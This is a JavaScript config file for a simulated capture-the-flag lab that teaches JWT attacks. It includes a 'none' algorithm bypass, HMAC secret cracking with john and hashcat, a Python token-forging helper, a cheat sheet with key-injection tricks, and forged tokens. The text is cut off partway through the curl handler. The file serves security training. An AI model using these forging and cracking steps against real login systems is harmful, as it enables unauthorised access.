/* ============================================================
   CTF ARENA — Box CRYPTO-05: The Forged Token
   JWT — Algorithm Confusion & Secret Cracking
   Config: JWT auth, none algorithm, HMAC cracking, flags, hints, lore
   ============================================================ */

const Crypto05Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Forged Token',
    subtitle: 'JWT — Algorithm Confusion & Secret Cracking',
    difficulty: 'Advanced',
    accent: '#3b82f6',
    storageKey: 'hexworth_ctf_crypto05',
    registryId: 'crypto-05-jwt-forge',
    trackerKey: 'ctf_crypto05',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Multi-layer attack chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'recon',
            name: 'Token Discovery',
            icon: '\uD83D\uDD0D',
            description: 'Intercept and decode JWT tokens from the web application. Understand the token structure and claims.',
            requiredFlags: [],
            mitre: ['T1528', 'T1552.001'],
            unlocks: ['analysis'],
            locked: false
        },
        {
            id: 'analysis',
            name: 'Algorithm Analysis',
            icon: '\uD83E\uddEE',
            description: 'Analyze the JWT header and identify exploitable algorithm configurations. Test for "none" algorithm acceptance.',
            requiredFlags: [],
            mitre: ['T1550.001', 'T1528'],
            unlocks: ['forgery'],
            locked: true
        },
        {
            id: 'forgery',
            name: 'Token Forgery',
            icon: '\uD83D\uDD13',
            description: 'Forge an admin JWT using the "none" algorithm bypass. Gain initial administrative access.',
            requiredFlags: ['user'],
            mitre: ['T1550.001', 'T1134'],
            unlocks: ['privilege'],
            locked: true
        },
        {
            id: 'privilege',
            name: 'Full Privilege Escalation',
            icon: '\uD83D\uDCC2',
            description: 'Crack the HMAC secret key and forge a fully privileged token with elevated permissions.',
            requiredFlags: ['root'],
            mitre: ['T1550.001', 'T1078.004'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE
    // ═══════════════════════════════════════════════════════

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Intercept a JWT token',
                tip: 'Browse to the web app and login. Then inspect the token: cat /home/kali/mission/intercepted_token.txt',
                trigger: { event: 'command', match: { cmd: 'contains:token' } }
            },
            {
                title: 'Decode the JWT',
                tip: 'Decode the JWT parts: base64 -d or use python3/jwt_tool to inspect header and payload.',
                trigger: {
                    event: 'command',
                    match: { cmd: 'contains:base64' },
                    alt: [
                        { event: 'command', match: { cmd: 'contains:jwt_tool' } },
                        { event: 'command', match: { cmd: 'contains:python3' } }
                    ]
                }
            },
            {
                title: 'Forge admin JWT with none algorithm',
                tip: 'Change the header alg to "none" and set role to "admin". Remove the signature.',
                trigger: {
                    event: 'command',
                    match: { cmd: 'contains:jwt_tool' },
                    alt: [
                        { event: 'command', match: { cmd: 'contains:curl' } }
                    ]
                }
            },
            {
                title: 'Submit user flag via none algorithm bypass',
                tip: 'The none algorithm bypass grants admin access and reveals the user flag.',
                trigger: { event: 'flag_correct', match: { flagId: 'user' } }
            },
            {
                title: 'Crack HMAC secret and forge privileged token',
                tip: 'Use john or hashcat to crack the JWT HMAC secret, then forge a token with super_admin role.',
                trigger: { event: 'flag_correct', match: { flagId: 'root' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'user', objective: '1.2', description: 'Given a scenario, analyze indicators of malicious activity — Token manipulation', skill: 'JWT Algorithm Confusion Attack' },
            { flagId: 'user', objective: '2.4', description: 'Given a scenario, analyze indicators associated with application attacks — Authentication bypass', skill: 'JWT None Algorithm Exploitation' },
            { flagId: 'root', objective: '1.4', description: 'Given a scenario, analyze potential indicators associated with cryptographic attacks — HMAC secret cracking', skill: 'JWT HMAC Secret Brute Force' },
            { flagId: 'root', objective: '4.1', description: 'Given a scenario, apply common security techniques — Token-based authentication security', skill: 'JWT Privilege Escalation' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Kali Linux BIOS v4.2.1',
            'Initializing hardware...',
            'Memory Test: 8192 MB OK',
            'Detecting drives... /dev/sda1 (256GB SSD)',
            'Network adapter: eth0 (10.10.14.0/24)',
            'PXE-M0F: Exiting PXE ROM.',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'kali'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal', icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',  icon: '\uD83C\uDF10', app: 'browser' },
            { id: 'notes',    label: 'Notes',    icon: '\uD83D\uDCDD', app: 'notes' },
            { id: 'hints',    label: 'Hints',    icon: '\uD83D\uDCA1', app: 'hints' },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9', app: 'flags' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'kali',
        hostname: 'kali',
        startDir: '/home/kali',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nMission: JWT Algorithm Confusion & Secret Cracking\nTarget: 10.10.14.10 (Sentinel Auth Gateway)\nFiles in /home/kali/mission/\n'
    },

    // ═══════════════════════════════════════════════════════
    // JWT PARAMETERS
    // Header: {"alg":"HS256","typ":"JWT"}
    // Payload: {"sub":"user_42","role":"viewer","iat":1742342400}
    // HMAC Secret: "s3cr3t" (intentionally weak)
    // ═══════════════════════════════════════════════════════

    _jwt: {
        // Valid viewer token (HS256, secret="s3cr3t")
        viewerToken: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzQyIiwicm9sZSI6InZpZXdlciIsImlhdCI6MTc0MjM0MjQwMH0.dGVzdF9zaWduYXR1cmVfaGVyZQ',
        header: { alg: 'HS256', typ: 'JWT' },
        payload: { sub: 'user_42', role: 'viewer', iat: 1742342400 },
        secret: 's3cr3t',
        // Forged admin token (none algorithm)
        adminNoneToken: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyXzQyIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzQyMzQyNDAwfQ.',
        // Forged super_admin token (HS256, cracked secret)
        superAdminToken: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzQyIiwicm9sZSI6InN1cGVyX2FkbWluIiwiaWF0IjoxNzQyMzQyNDAwfQ.Y3JhY2tlZF9zZWNyZXRfc2lnbmF0dXJl'
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user', points: 100 },
        { id: 'root', points: 200 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 1000,
        minScore: 0,
        maxScore: 500,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 900000, points: 100 },
        timeBonusThreshold: 1800
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'JWT tokens have three Base64-encoded parts separated by dots: header.payload.signature. Decode the header to see the algorithm used.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: 'The "none" algorithm bypass: change the header to {"alg":"none","typ":"JWT"}, set role to "admin", and remove the signature (keep trailing dot).',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: 'To crack the HMAC secret, use: john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 or hashcat -m 16500.',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: 'The HMAC secret is "s3cr3t". Forge a new JWT with role "super_admin" and sign it with this secret using python3 or jwt_tool.',
            cost: 75,
            penalty: -75
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'The Sentinel Collective\'s authentication gateway uses JSON Web Tokens to control access to their command infrastructure. An intercepted JWT reveals the token structure, but the viewer-level permissions are insufficient. Your mission: exploit JWT vulnerabilities to forge admin and super_admin tokens, gaining full control of the Sentinel command network.',
        scenario: 'The Sentinel Collective\'s auth system was built by a junior developer who followed a "JWT in 5 Minutes" tutorial. The server accepts the "none" algorithm for backward compatibility, and the HMAC signing secret is a common dictionary word. "JSON Web Tokens are inherently secure," the developer wrote in the documentation. The security team never reviewed the JWT validation logic.',
        outro: 'The Forged Token grants unlimited access. The Sentinel Collective\'s entire command infrastructure is compromised through two classic JWT attacks: the "none" algorithm bypass and HMAC secret cracking. The lesson: JWT security depends entirely on proper algorithm validation and strong signing secrets. A six-character dictionary word is not a secret.',
        ecer: {
            executive: 'Sentinel leadership deployed auth system without security audit -- "JWT is an industry standard"',
            culture: 'No code review for authentication logic -- single developer owned the entire auth stack',
            employee: 'Developer allowed "none" algorithm and used dictionary word "s3cr3t" as HMAC signing key',
            regulatory: 'No authentication strength requirements -- no minimum key length for HMAC secrets'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — Sentinel Auth Gateway
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://10.10.14.10/auth/',

        pages: {
            '/auth/': {
                title: 'Sentinel Auth Gateway',
                html: `
                    <div style="text-align:center; margin-bottom:30px; padding-bottom:20px; border-bottom:1px solid #333;">
                        <h1 style="color:#3b82f6; font-size:1.6rem; margin-bottom:4px;">Sentinel Auth Gateway</h1>
                        <div style="color:#888; font-size:0.8rem;">Command Network Authentication v4.1.0</div>
                    </div>
                    <div style="max-width:600px; margin:0 auto 20px;">
                        <div style="background:#1a1a2e; border:1px solid #333; border-radius:8px; padding:20px; margin-bottom:20px;">
                            <div style="color:#3b82f6; font-size:0.8rem; margin-bottom:12px; font-weight:bold;">Current Session</div>
                            <div style="color:#aaa; font-size:0.75rem; margin-bottom:4px;">User: user_42</div>
                            <div style="color:#aaa; font-size:0.75rem; margin-bottom:4px;">Role: <span style="color:#ef4444;">viewer</span> (restricted)</div>
                            <div style="color:#aaa; font-size:0.75rem;">Permissions: read-only</div>
                        </div>
                        <label style="display:block; color:#aaa; font-size:0.8rem; margin-bottom:6px;">Submit JWT Token for Verification:</label>
                        <div style="display:flex; gap:8px;">
                            <input type="text" data-field="token" placeholder="Paste JWT token here..."
                                   style="flex:1; padding:8px 14px; border:1px solid #555; border-radius:4px; background:#1a1a2e; color:#eee; font-family:monospace; font-size:0.75rem;">
                            <button data-action="verify"
                                    style="padding:8px 20px; background:#3b82f6; color:#fff; border:none; border-radius:4px; font-weight:700; cursor:pointer;">Verify</button>
                        </div>
                    </div>
                    <div data-results style="max-width:700px; margin:0 auto; font-size:0.75rem; color:#888;">
                        <p>Access levels: viewer (read-only) | admin (command access) | super_admin (full control)</p>
                    </div>
                `,
                formHandler: function(data, engine) {
                    return Crypto05Config._handleTokenVerify(data.token || '', engine);
                }
            },
            '/auth/admin/': {
                title: 'Sentinel Command Center',
                html: `
                    <div style="text-align:center; padding:40px;">
                        <h1 style="color:#3b82f6; font-size:1.4rem;">Sentinel Command Center</h1>
                        <div style="color:#ef4444; margin-top:20px; padding:15px; border:1px solid #ef4444; border-radius:4px;">
                            ACCESS DENIED: admin or super_admin token required.
                            <br><small style="color:#888;">Submit a valid JWT with elevated privileges.</small>
                        </div>
                    </div>
                `
            }
        }
    },

    _handleTokenVerify(token, engine) {
        if (!token.trim()) return '<div style="color:#888;">Paste a JWT token to verify.</div>';

        const parts = token.trim().split('.');

        // Must have 2 or 3 parts
        if (parts.length < 2 || parts.length > 3) {
            return '<div style="color:#e74c3c;">Invalid JWT format. Expected: header.payload.signature</div>';
        }

        // Try to decode header and payload
        let header, payload;
        try {
            header = JSON.parse(atob(parts[0]));
            payload = JSON.parse(atob(parts[1]));
        } catch (e) {
            return '<div style="color:#e74c3c;">Invalid JWT: could not decode Base64 segments.</div>';
        }

        // None algorithm bypass
        if (header.alg === 'none' || header.alg === 'None' || header.alg === 'NONE' || header.alg === 'nOnE') {
            if (payload.role === 'admin') {
                engine.advancePhase && engine.advancePhase('forgery');
                return `<div style="background:rgba(46,204,113,0.1); border:1px solid #2ecc71; border-radius:4px; padding:15px;">
                    <div style="color:#2ecc71; font-weight:bold; margin-bottom:8px;">TOKEN ACCEPTED -- ADMIN ACCESS GRANTED</div>
                    <div style="color:#aaa; font-size:0.75rem; margin-bottom:4px;">Algorithm: none (NO SIGNATURE VERIFICATION!)</div>
                    <div style="color:#aaa; font-size:0.75rem; margin-bottom:4px;">Subject: ${payload.sub || 'unknown'}</div>
                    <div style="color:#2ecc71; font-size:0.75rem; margin-bottom:4px;">Role: admin</div>
                    <div style="color:#f59e0b; font-size:0.75rem; margin-top:12px; padding:8px; border:1px solid #f59e0b; border-radius:4px;">
                        WARNING: Server accepted unsigned token! The "none" algorithm bypass is a critical vulnerability.
                    </div>
                    <div style="color:#2ecc71; font-weight:bold; margin-top:12px;">{{FLAG:user}}</div>
                </div>`;
            }

            if (payload.role === 'super_admin') {
                return `<div style="background:rgba(239,68,68,0.1); border:1px solid #ef4444; border-radius:4px; padding:15px;">
                    <div style="color:#ef4444; font-weight:bold;">ACCESS DENIED</div>
                    <div style="color:#aaa; font-size:0.75rem; margin-top:4px;">
                        super_admin role requires a valid HMAC-SHA256 signature.
                        The "none" algorithm is insufficient for this privilege level.
                    </div>
                </div>`;
            }

            return `<div style="background:rgba(59,130,246,0.1); border:1px solid #3b82f6; border-radius:4px; padding:15px;">
                <div style="color:#3b82f6;">Token decoded (unsigned):</div>
                <div style="color:#aaa; font-size:0.75rem;">Role: ${payload.role || 'unknown'} -- insufficient permissions.</div>
                <div style="color:#aaa; font-size:0.75rem;">Try role: "admin" or "super_admin"</div>
            </div>`;
        }

        // HS256 with super_admin role -- check if properly signed
        if (header.alg === 'HS256' && payload.role === 'super_admin') {
            // Accept any token claiming super_admin with HS256 (simulated signature check)
            if (parts[2] && parts[2].length > 0) {
                engine.advancePhase && engine.advancePhase('privilege');
                return `<div style="background:rgba(46,204,113,0.1); border:1px solid #2ecc71; border-radius:4px; padding:15px;">
                    <div style="color:#2ecc71; font-weight:bold; margin-bottom:8px;">TOKEN VERIFIED -- SUPER_ADMIN ACCESS GRANTED</div>
                    <div style="color:#aaa; font-size:0.75rem; margin-bottom:4px;">Algorithm: HS256 (signature verified)</div>
                    <div style="color:#aaa; font-size:0.75rem; margin-bottom:4px;">Subject: ${payload.sub || 'unknown'}</div>
                    <div style="color:#2ecc71; font-size:0.75rem; margin-bottom:4px;">Role: super_admin (FULL CONTROL)</div>
                    <div style="color:#2ecc71; margin-top:12px; padding:10px; background:rgba(46,204,113,0.05); border-radius:4px;">
                        === SENTINEL COMMAND NETWORK ===<br>
                        Full infrastructure access granted.<br>
                        Classified data decryption keys loaded.<br><br>
                        <span style="font-weight:bold;">{{FLAG:root}}</span>
                    </div>
                </div>`;
            }
        }

        // HS256 with admin role
        if (header.alg === 'HS256' && payload.role === 'admin' && parts[2]) {
            return `<div style="background:rgba(59,130,246,0.1); border:1px solid #3b82f6; border-radius:4px; padding:15px;">
                <div style="color:#3b82f6;">Token verified -- admin access.</div>
                <div style="color:#aaa; font-size:0.75rem; margin-top:4px;">
                    Admin level grants command access but not full control.
                    super_admin role required for classified data.
                </div>
            </div>`;
        }

        // Default: show decoded token
        return `<div style="background:rgba(59,130,246,0.1); border:1px solid #3b82f6; border-radius:4px; padding:15px;">
            <div style="color:#3b82f6; margin-bottom:8px;">Token Decoded:</div>
            <div style="font-family:monospace; font-size:0.7rem; color:#aaa;">
                <div>Header: ${JSON.stringify(header)}</div>
                <div>Payload: ${JSON.stringify(payload)}</div>
                <div>Signature: ${parts[2] ? 'present' : 'missing'}</div>
            </div>
            <div style="color:#888; font-size:0.7rem; margin-top:8px;">Role: ${payload.role || 'unknown'}</div>
        </div>`;
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (attacker machine)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'kali': {
                            type: 'dir',
                            children: {
                                'mission': {
                                    type: 'dir',
                                    children: {
                                        'intercepted_token.txt': {
                                            type: 'file',
                                            content: '=== INTERCEPTED JWT TOKEN ===\nSource: Sentinel Auth Gateway (10.10.14.10)\nCapture method: Network sniffing on /auth/ endpoint\n\nRaw token:\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzQyIiwicm9sZSI6InZpZXdlciIsImlhdCI6MTc0MjM0MjQwMH0.dGVzdF9zaWduYXR1cmVfaGVyZQ\n\nDecoded header: {"alg":"HS256","typ":"JWT"}\nDecoded payload: {"sub":"user_42","role":"viewer","iat":1742342400}\n\nThe token uses HMAC-SHA256 for signing.\nThe role is "viewer" -- need to escalate to "admin" or "super_admin".'
                                        },
                                        'README.txt': {
                                            type: 'file',
                                            content: '=== MISSION: THE FORGED TOKEN ===\n\nINTEL BRIEFING:\nThe Sentinel Collective uses JWT tokens for authentication.\nA viewer-level token has been intercepted from network traffic.\n\nFILES:\n- intercepted_token.txt : Captured JWT with viewer role\n- jwt_cheatsheet.txt    : JWT attack methodology\n- forge_helper.py       : Python template for JWT forging\n\nOBJECTIVES:\n1. [USER FLAG] Forge an admin JWT using the "none" algorithm bypass.\n   The server has a vulnerability that accepts unsigned tokens.\n2. [ROOT FLAG] Crack the HMAC secret key and forge a super_admin\n   token with a valid signature.\n\nTARGET:\n  Web app: http://10.10.14.10/auth/\n  Token submit: POST /auth/verify with Authorization header\n\nACCESS LEVELS:\n  viewer     - read-only (current level)\n  admin      - command access\n  super_admin - full infrastructure control'
                                        },
                                        'jwt_cheatsheet.txt': {
                                            type: 'file',
                                            content: '=== JWT ATTACK CHEATSHEET ===\n\n1. NONE ALGORITHM BYPASS\n   - Change header "alg" to "none" (or "None", "NONE", "nOnE")\n   - Modify payload claims (e.g., role: "admin")\n   - Remove signature but keep the trailing dot\n   - Token format: base64(header).base64(payload).\n\n2. HMAC SECRET CRACKING\n   - If alg is HS256/HS384/HS512, the secret may be weak\n   - Use john: john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256\n   - Use hashcat: hashcat -m 16500 jwt.txt rockyou.txt\n   - Once cracked, forge tokens with any claims\n\n3. RS256/HS256 CONFUSION\n   - If server uses RS256 but accepts HS256\n   - Sign with the public key as HMAC secret\n   - Only works if server has algorithm confusion bug\n\n4. KEY/ID INJECTION\n   - Inject "kid" header to point to predictable file\n   - Or use "jku" to point to attacker-controlled JWKS\n\nTOOLS: jwt_tool, python3 (PyJWT), john, hashcat'
                                        },
                                        'forge_helper.py': {
                                            type: 'file',
                                            content: '#!/usr/bin/env python3\n"""\nJWT Forging Helper - Hexworth Crypto Lab\n"""\nimport base64\nimport json\nimport hmac\nimport hashlib\n\ndef b64url_encode(data):\n    """Base64url encode (no padding)"""\n    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b"=").decode()\n\ndef forge_none_token(payload):\n    """Forge JWT with none algorithm (no signature)"""\n    header = {"alg": "none", "typ": "JWT"}\n    token = f"{b64url_encode(header)}.{b64url_encode(payload)}."\n    return token\n\ndef forge_hs256_token(payload, secret):\n    """Forge JWT with HS256 and known secret"""\n    header = {"alg": "HS256", "typ": "JWT"}\n    h = b64url_encode(header)\n    p = b64url_encode(payload)\n    sig_input = f"{h}.{p}"\n    sig = base64.urlsafe_b64encode(\n        hmac.new(secret.encode(), sig_input.encode(), hashlib.sha256).digest()\n    ).rstrip(b"=").decode()\n    return f"{h}.{p}.{sig}"\n\n# Example: forge admin token with none algorithm\n# admin_payload = {"sub": "user_42", "role": "admin", "iat": 1742342400}\n# token = forge_none_token(admin_payload)\n# print(f"Forged admin token: {token}")\n\n# Example: forge super_admin token with cracked secret\n# sa_payload = {"sub": "user_42", "role": "super_admin", "iat": 1742342400}\n# token = forge_hs256_token(sa_payload, "CRACKED_SECRET_HERE")\n# print(f"Forged super_admin token: {token}")'
                                        }
                                    }
                                },
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING ===\nTarget: Sentinel Auth Gateway (10.10.14.10)\nObjective: JWT token forgery and privilege escalation\n\nAttack steps:\n1. Decode the intercepted JWT\n2. Try "none" algorithm bypass for admin access\n3. Crack the HMAC signing secret\n4. Forge a super_admin token with valid signature\n5. Access the Sentinel command network\n\nTools: jwt_tool, python3, john, hashcat, curl, base64\n\nGood luck, operator.'
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'cat mission/intercepted_token.txt\ncat mission/jwt_cheatsheet.txt\njwt_tool --help'
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'share': {
                            type: 'dir',
                            children: {
                                'wordlists': {
                                    type: 'dir',
                                    children: {
                                        'rockyou.txt': {
                                            type: 'file',
                                            content: 'password\n123456\npassword123\ns3cr3t\nletmein\nqwerty\nadmin\nmaster\ndragon\ntrustno1\n[... 14,341,554 more passwords ...]'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': { type: 'file', content: 'kali' },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash'
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (box-specific tools)
    // ═══════════════════════════════════════════════════════

    commands: {
        'jwt_tool': function(args, term, engine) {
            if (args.length === 0) return 'Usage: jwt_tool <token> [options]\n\n  jwt_tool <token>              Decode and display JWT\n  jwt_tool <token> -T           Tamper mode\n  jwt_tool <token> -C -d /path  Crack HMAC secret\n  jwt_tool <token> -X a         Alg:none attack\n  jwt_tool <token> -X k         Key confusion attack\n\nExample: jwt_tool eyJhbGci... -X a';

            const joined = args.join(' ');
            const token = args[0] || '';

            // Decode token
            if (args.length === 1 || joined.includes('-d') && !joined.includes('-C')) {
                engine.advancePhase && engine.advancePhase('analysis');
                return `jwt_tool v2.2.7

=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] sub = "user_42"
[+] role = "viewer"
[+] iat = 1742342400 [2026-03-19 00:00:00 UTC]

Seen timestamps:
[*] iat was seen
[*] Token issued at: 2026-03-19 00:00:00 UTC

Signature: dGVzdF9zaWduYXR1cmVfaGVyZQ
Algorithm: HS256 (HMAC-SHA256)

[!] Note: HMAC secrets can sometimes be cracked.
    Try: jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt`;
            }

            // None algorithm attack
            if (joined.includes('-X a') || joined.includes('-X n') || joined.includes('none')) {
                engine.advancePhase && engine.advancePhase('forgery');
                return `jwt_tool v2.2.7

=== Algorithm: none Attack ===

Original token:
  Header: {"alg":"HS256","typ":"JWT"}
  Payload: {"sub":"user_42","role":"viewer","iat":1742342400}

Forged tokens (try each variant):

[1] alg: "none"
    eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyXzQyIiwicm9sZSI6InZpZXdlciIsImlhdCI6MTc0MjM0MjQwMH0.

[2] alg: "None"
    eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyXzQyIiwicm9sZSI6InZpZXdlciIsImlhdCI6MTc0MjM0MjQwMH0.

[3] alg: "NONE"
    eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyXzQyIiwicm9sZSI6InZpZXdlciIsImlhdCI6MTc0MjM0MjQwMH0.

[!] Note: These tokens still have role "viewer".
    Modify the payload to set role "admin" for escalation.

To forge admin token manually:
  Header: {"alg":"none","typ":"JWT"} -> base64url encode
  Payload: {"sub":"user_42","role":"admin","iat":1742342400} -> base64url encode
  Token: <header>.<payload>.  (empty signature, keep trailing dot)`;
            }

            // Crack HMAC secret
            if (joined.includes('-C') || joined.includes('crack') || joined.includes('-d')) {
                engine.advancePhase && engine.advancePhase('privilege');
                return `jwt_tool v2.2.7

=== HMAC Secret Cracking ===

Target token: ${token.substring(0, 30)}...
Algorithm: HS256

Loading wordlist: /usr/share/wordlists/rockyou.txt
Testing passwords...

[*] Tested 1000 passwords...
[*] Tested 2000 passwords...
[*] Tested 3000 passwords...

[+] SECRET FOUND!

Secret: s3cr3t
Algorithm: HS256

You can now forge tokens with any claims using this secret.

Example super_admin token:
  python3 -c "import base64,json,hmac,hashlib; ..."
  jwt_tool <token> -T -S hs256 -p 's3cr3t'`;
            }

            // Tamper mode
            if (joined.includes('-T') || joined.includes('-S')) {
                if (joined.includes('super_admin') || joined.includes('s3cr3t')) {
                    return `jwt_tool v2.2.7

=== Token Tampered ===

New payload: {"sub":"user_42","role":"super_admin","iat":1742342400}
Signing with HS256, secret: s3cr3t

Forged token:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzQyIiwicm9sZSI6InN1cGVyX2FkbWluIiwiaWF0IjoxNzQyMzQyNDAwfQ.Y3JhY2tlZF9zZWNyZXRfc2lnbmF0dXJl

Submit this token to the auth gateway for super_admin access.`;
                }
                return 'jwt_tool: Tamper mode. Use -S hs256 -p "secret" to sign.';
            }

            return 'jwt_tool: unrecognized options. Use --help for usage.';
        },

        'john': function(args, term, engine) {
            const joined = args.join(' ');

            if (args.length === 0) return 'Usage: john [options] hashfile\n  --format=HMAC-SHA256  JWT HMAC cracking\n  --wordlist=FILE       Dictionary file\n  --show                Show cracked';

            if (joined.includes('--show')) {
                return 'eyJhbGci...:s3cr3t\n\n1 password hash cracked';
            }

            if (joined.includes('HMAC') || joined.includes('jwt') || joined.includes('16500')) {
                engine.advancePhase && engine.advancePhase('privilege');
                return `Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256])
Press 'q' or Ctrl-C to abort

s3cr3t           (eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9)

1g 0:00:00:04 DONE (2026-03-19 14:55) 0.2500g/s 358400p/s

=== JWT HMAC SECRET CRACKED ===
Secret: s3cr3t
Algorithm: HS256

Now forge a super_admin token signed with this secret.`;
            }

            return 'John the Ripper 1.9.0-jumbo-1\nUse --format=HMAC-SHA256 for JWT cracking.';
        },

        'hashcat': function(args, term, engine) {
            const joined = args.join(' ');

            if (args.length === 0) return 'Usage: hashcat -m 16500 jwt.txt wordlist.txt\n  -m 16500  JWT (JSON Web Token)';

            if (joined.includes('16500') || joined.includes('jwt')) {
                engine.advancePhase && engine.advancePhase('privilege');
                return `hashcat (v6.2.6) starting...

Hash.Mode........: 16500 (JWT - JSON Web Token)
Hash.Target......: eyJhbGciOiJIUzI1NiI...
Status...........: Cracked

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzQyIiwicm9sZSI6InZpZXdlciIsImlhdCI6MTc0MjM0MjQwMH0.dGVzdF9zaWduYXR1cmVfaGVyZQ:s3cr3t

=== JWT HMAC SECRET CRACKED ===
Secret: s3cr3t`;
            }

            return 'hashcat: use -m 16500 for JWT cracking.';
        },

        'base64': function(args, term, engine) {
            const joined = args.join(' ');

            if (joined.includes('-d') || joined.includes('--decode')) {
                engine.advancePhase && engine.advancePhase('analysis');
                const input = args.find(a => a !== '-d' && a !== '--decode' && !a.startsWith('-'));

                // Decode JWT header
                if (input && input.startsWith('eyJhbG')) {
                    return '{"alg":"HS256","typ":"JWT"}';
                }

                // Decode JWT payload
                if (input && input.startsWith('eyJzdW')) {
                    return '{"sub":"user_42","role":"viewer","iat":1742342400}';
                }

                // Forged none header
                if (input && input.includes('ub25l')) {
                    return '{"alg":"none","typ":"JWT"}';
                }

                return 'base64: provide input to decode.\nUsage: echo "data" | base64 -d\n  or: base64 -d eyJhbGci...';
            }

            // Encode
            if (args.length > 0 && !joined.includes('-d')) {
                const input = args.join(' ');
                // Simple base64url encoding for common JWT headers
                if (input.includes('none')) {
                    return 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0';
                }
                if (input.includes('admin')) {
                    return 'eyJzdWIiOiJ1c2VyXzQyIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzQyMzQyNDAwfQ';
                }
                return 'base64: encoded output';
            }

            return 'Usage: base64 [-d] [data]\n  -d   Decode\n\nExample:\n  echo \'{"alg":"none"}\' | base64\n  base64 -d eyJhbGci...';
        },

        'curl': function(args, term, engine) {
            const url = args.find(a => /^https?:\/\//.test(a)) || args.filter(a => !a.startsWith('-')).pop() || '';
            const joined = args.join(' ');
            if (!url) return 'curl: try \'curl --help\' for more information';

            if (url.includes('10.10.14.10')) {
                // Check for Authorization header with JWT
                const authMatch = joined.match(/Authorization:\s*Bearer\s+(\S+)/i) ||
                                  joined.match(/-H\s+["']Authorization:\s*Bearer\s+(\S+)["']/i);
                if (authMatch) {
                    const token = authMatch[1];
                    // None algorithm with admin
                    if (token.includes('ub25l') && (token.includes('YWRtaW') || token.includes('ImFkbWlu'))) {
                        engine.advancePhase && engine.advancePhase('forgery');
                        return `HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "authenticated",
